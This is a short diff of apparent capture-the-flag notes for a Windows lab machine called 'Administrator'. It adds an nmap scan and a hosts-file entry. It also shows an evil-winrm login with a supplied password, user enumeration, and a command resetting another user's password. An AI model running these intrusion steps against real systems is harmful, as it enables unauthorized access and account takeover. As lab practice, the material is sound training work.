@@ -1,6 +1,11 @@
 
 #ADMINISTRATOR (window lab)
 
+nmap -sC -sV 10.10.11.42 -T5 
+nano /etc/hosts
+> 10.10.11.42 administrator.htb
+
+
 evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
 net users
 net user michael Password123
